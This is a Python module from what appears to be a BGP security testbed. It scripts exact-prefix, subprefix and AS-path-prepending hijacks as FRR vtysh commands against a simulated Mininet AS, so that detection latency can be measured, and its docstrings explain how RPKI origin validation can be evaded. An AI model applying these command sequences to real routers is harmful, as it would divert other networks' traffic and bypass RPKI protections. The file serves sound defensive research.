"""
src/attacker/controller.py
───────────────────────────
Attack Controller
──────────────────
Implements the three BGP attack scenarios by injecting malicious
vtysh commands into the AS99 FRR instance running inside Mininet.

Each attack function:
  1. Records the exact attack start time (T0) for latency measurement
  2. Constructs the vtysh command sequence to announce/manipulate prefixes
  3. Triggers BGP UPDATE propagation
  4. Returns T0 so the monitor can compute detection latency

All attacks are reversible — each has a corresponding withdraw() that
restores the routing table to its clean baseline state.

IMPORTANT: These functions assume they are running in the context of a
           live Mininet topology where 'as99' is a running FRR node.
           For unit testing, use the mock helpers in tests/fixtures.py.
"""

from __future__ import annotations

import logging
import time
from dataclasses import dataclass, field
from typing import Optional

logger = logging.getLogger(__name__)


# --------------------------------------------------------------------------- #
# FRR Interface
# --------------------------------------------------------------------------- #

# Runtime socket directory — must match builder.py RUN_BASE
_RUN_BASE = "/tmp/frr-run"


def _vtysh(node_name: str, *commands: str, net=None) -> str:
    """
    Execute vtysh commands on a named Mininet node.

    Uses -N <rundir> to connect to the per-namespace bgpd socket, not the
    system-wide FRR daemon. This is required on Ubuntu 24.04.

    In dry-run / test context, net is None and commands are logged only.
    """
    run_dir  = f"{_RUN_BASE}/{node_name}"
    cmd_str  = " ".join(f'-c "{c}"' for c in commands)
    vty_sock = f"{run_dir}/bgpd.vty"
    full_cmd = f"/usr/bin/vtysh --vty_socket {vty_sock} {cmd_str}"

    if net is None:
        logger.debug("[DRY-RUN] %s: %s", node_name, full_cmd)
        return ""

    node   = net.get(node_name)
    output = node.cmd(full_cmd)
    logger.debug("[VTYSH] %s → %s", node_name, output.strip() or "(no output)")
    
    # Check for errors in output
    if "%" in output or "failed" in output.lower() or "error" in output.lower():
        logger.error("[VTYSH ERROR] %s: %s", node_name, output.strip())
        raise RuntimeError(f"VTYSH command failed on {node_name}: {output.strip()}")
    
    return output


def _trigger_bgp_propagation(node_name: str, net=None) -> None:
    """Force a soft BGP reset to trigger immediate UPDATE propagation."""
    _vtysh(node_name, "clear ip bgp * soft out", net=net)


# --------------------------------------------------------------------------- #
# Attack Result
# --------------------------------------------------------------------------- #

@dataclass
class AttackResult:
    """Metadata recorded at attack launch time."""
    scenario:         str
    attack_start_s:   float
    target_prefix:    str
    attacker_as:      int = 99
    withdrawn:        bool = False
    notes:            list[str] = field(default_factory=list)


# --------------------------------------------------------------------------- #
# Attack Scenarios
# --------------------------------------------------------------------------- #

class AttackController:
    """
    Implements all three BGP attack scenarios against AS99.

    Methods:
        exact_prefix_hijack()  — Type 1: announce victim's exact prefix
        subprefix_hijack()     — Type 2: announce more-specific subprefix
        path_manipulation()    — Type 3: manipulate AS_PATH to appear shorter
        withdraw_all()         — Remove all malicious announcements

    All methods accept an optional `net` argument. Pass None for
    dry-run mode (useful in unit tests and CI environments without Mininet).
    """

    ATTACKER_NODE = "as99"
    ATTACKER_ASN  = 99

    def exact_prefix_hijack(
        self,
        victim_prefix: str = "10.10.0.0/16",
        net=None,
    ) -> AttackResult:
        """
        Attack Scenario 1: Exact Prefix Hijack.

        The attacker announces the victim's exact prefix from AS99.
        Routers nearer to AS99 will route victim-bound traffic to the attacker.
        Routers nearer to the victim will route correctly.
        Traffic is therefore split — a partial hijack.

        Detection:
          - Anomaly detector: DETECTS (new origin AS for known prefix)
          - RPKI ROV:         INVALID  (ROA specifies AS10, not AS99)

        Args:
            victim_prefix: The exact IP prefix to hijack (CIDR notation).
            net:           Mininet network object (None = dry-run).

        Returns:
            AttackResult with T0 timestamp.
        """
        t0 = time.time()
        logger.warning(
            "[ATTACK] Scenario 1 — EXACT PREFIX HIJACK: %s at %.3f",
            victim_prefix, t0,
        )

        # Inject static route for the prefix to enable BGP announcement
        _vtysh(
            self.ATTACKER_NODE,
            "configure terminal",
            f"ip route {victim_prefix} null0",
            "end",
            net=net,
        )

        # Inject the hijacked announcement
        _vtysh(
            self.ATTACKER_NODE,
            "configure terminal",
            f"router bgp {self.ATTACKER_ASN}",
            "address-family ipv4 unicast",
            f"network {victim_prefix}",
            "exit-address-family",
            "end",
            net=net,
        )
        _trigger_bgp_propagation(self.ATTACKER_NODE, net=net)

        return AttackResult(
            scenario="exact_prefix",
            attack_start_s=t0,
            target_prefix=victim_prefix,
            notes=[
                "Exact-prefix hijack: traffic split between victim and attacker",
                "BGP decision process determines which ASes route to attacker",
            ],
        )

    def subprefix_hijack(
        self,
        subprefix: str = "10.10.1.0/24",
        net=None,
    ) -> AttackResult:
        """
        Attack Scenario 2: More-Specific Subprefix Hijack.

        The attacker announces a /24 that is more specific than the victim's
        /16. BGP always prefers more-specific routes. Therefore ALL traffic
        globally destined for 10.10.1.0/24 is redirected to the attacker,
        regardless of AS proximity.

        This is the most dangerous attack type.

        RPKI evasion note:
          - If ROA for 10.10.0.0/16 has maxLength=/16 → ROV returns INVALID ✓
          - If ROA for 10.10.0.0/16 has maxLength=/24 → ROV returns VALID ✗
            (a common misconfiguration that allows this attack to evade RPKI)

        Detection:
          - Anomaly detector: DETECTS (new prefix entirely)
          - RPKI ROV:         INVALID only if ROA maxLength is tight (=/16)

        Args:
            subprefix: More-specific prefix to announce. Must be contained
                       within the victim's /16.
            net:       Mininet network object (None = dry-run).

        Returns:
            AttackResult with T0 timestamp.
        """
        t0 = time.time()
        logger.warning(
            "[ATTACK] Scenario 2 — SUBPREFIX HIJACK: announcing %s at %.3f",
            subprefix, t0,
        )

        # Inject static route for the subprefix
        _vtysh(
            self.ATTACKER_NODE,
            "configure terminal",
            f"ip route {subprefix} null0",
            "end",
            net=net,
        )

        _vtysh(
            self.ATTACKER_NODE,
            "configure terminal",
            f"router bgp {self.ATTACKER_ASN}",
            "address-family ipv4 unicast",
            f"network {subprefix}",
            "exit-address-family",
            "end",
            net=net,
        )
        _trigger_bgp_propagation(self.ATTACKER_NODE, net=net)

        return AttackResult(
            scenario="subprefix",
            attack_start_s=t0,
            target_prefix=subprefix,
            notes=[
                "Subprefix hijack: 100% of traffic to this /24 rerouted to attacker",
                "RPKI evasion possible if ROA maxLength is set to /24",
            ],
        )

    def path_manipulation(
        self,
        victim_prefix: str = "10.10.0.0/16",
        victim_asn: int = 10,
        net=None,
    ) -> AttackResult:
        """
        Attack Scenario 3: AS Path Manipulation (Route Leak).

        The attacker announces the victim's prefix with a fabricated AS_PATH
        that includes the victim's ASN (path stuffing). This makes the
        attacker appear to be a legitimate path to the victim's prefix,
        and may be preferred by routers that see a shorter path to AS99.

        Critically: RPKI ROV cannot detect this because ROV only validates
        the origin AS (rightmost in path) and the prefix length. If AS99
        prepends AS10 to its path, the origin AS appears to be AS10 —
        which matches the ROA — and ROV returns VALID despite the attack.

        Detection:
          - Anomaly detector: DETECTS via path_manipulation check (unexpected AS relationships)
          - RPKI ROV:         NOT DETECTED (RPKI blind spot)

        Args:
            victim_prefix: Prefix to announce with manipulated path.
            victim_asn:    The victim's ASN to prepend (makes origin appear legitimate).
            net:           Mininet network object (None = dry-run).

        Returns:
            AttackResult with T0 timestamp.
        """
        t0 = time.time()
        logger.warning(
            "[ATTACK] Scenario 3 — AS PATH MANIPULATION: prefix=%s "
            "prepending AS%d at %.3f",
            victim_prefix, victim_asn, t0,
        )

        # Create a route-map that prepends the victim's ASN to our path
        # Result: AS_PATH appears as [99, 10] — origin looks like AS10
        _vtysh(
            self.ATTACKER_NODE,
            "configure terminal",
            f"ip route {victim_prefix} null0",
            "end",
            net=net,
        )
        _vtysh(
            self.ATTACKER_NODE,
            "configure terminal",
            "route-map HIJACK_PATH permit 10",
            f"set as-path prepend {victim_asn}",
            "exit",
            f"router bgp {self.ATTACKER_ASN}",
            "address-family ipv4 unicast",
            f"network {victim_prefix}",
            "neighbor 172.16.2.254 route-map HIJACK_PATH out",
            "neighbor 172.16.3.254 route-map HIJACK_PATH out",
            "exit-address-family",
            "end",
            net=net,
        )
        _trigger_bgp_propagation(self.ATTACKER_NODE, net=net)

        return AttackResult(
            scenario="path_manipulation",
            attack_start_s=t0,
            target_prefix=victim_prefix,
            notes=[
                f"AS_PATH prepended with AS{victim_asn} — origin appears legitimate to RPKI",
                "RPKI ROV returns VALID — this is a documented RPKI blind spot",
                "Anomaly detection can catch this via AS relationship analysis",
            ],
        )

    def withdraw_all(
        self,
        prefixes: Optional[list[str]] = None,
        net=None,
    ) -> float:
        """
        Withdraw all malicious announcements from AS99 and restore clean state.

        Args:
            prefixes: List of prefixes to withdraw. If None, withdraws
                      all known attack prefixes.
            net:      Mininet network object (None = dry-run).

        Returns:
            Timestamp of withdrawal for recovery-time measurement.
        """
        default_prefixes = ["10.10.0.0/16", "10.10.1.0/24"]
        targets = prefixes or default_prefixes

        t_withdraw = time.time()
        logger.info("[ATTACK] Withdrawing all announcements at %.3f", t_withdraw)

        for prefix in targets:
            _vtysh(
                self.ATTACKER_NODE,
                "configure terminal",
                f"no ip route {prefix} null0",
                "end",
                net=net,
            )
            _vtysh(
                self.ATTACKER_NODE,
                "configure terminal",
                f"router bgp {self.ATTACKER_ASN}",
                "address-family ipv4 unicast",
                f"no network {prefix}",
                "exit-address-family",
                "end",
                net=net,
            )

        # Also remove any route-maps applied during path manipulation
        _vtysh(
            self.ATTACKER_NODE,
            "configure terminal",
            f"router bgp {self.ATTACKER_ASN}",
            "address-family ipv4 unicast",
            "no neighbor 172.16.2.254 route-map HIJACK_PATH out",
            "no neighbor 172.16.3.254 route-map HIJACK_PATH out",
            "exit-address-family",
            "no route-map HIJACK_PATH",
            "end",
            net=net,
        )

        _trigger_bgp_propagation(self.ATTACKER_NODE, net=net)
        logger.info("[ATTACK] All malicious announcements withdrawn.")
        return t_withdraw


if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser(description="Manual BGP Attack Injection")
    parser.add_argument("--scenario", required=True, choices=["exact_prefix", "subprefix", "path_manipulation"])
    parser.add_argument("--net", action="store_true", help="Run in live Mininet mode (requires net object)")
    args = parser.parse_args()
    
    controller = AttackController()
    if args.scenario == "exact_prefix":
        result = controller.exact_prefix_hijack(net=None)  # For manual testing, assume dry-run
    elif args.scenario == "subprefix":
        result = controller.subprefix_hijack(net=None)
    elif args.scenario == "path_manipulation":
        result = controller.path_manipulation(net=None)
    print(f"Attack launched: {result.scenario} at {result.attack_start_s}")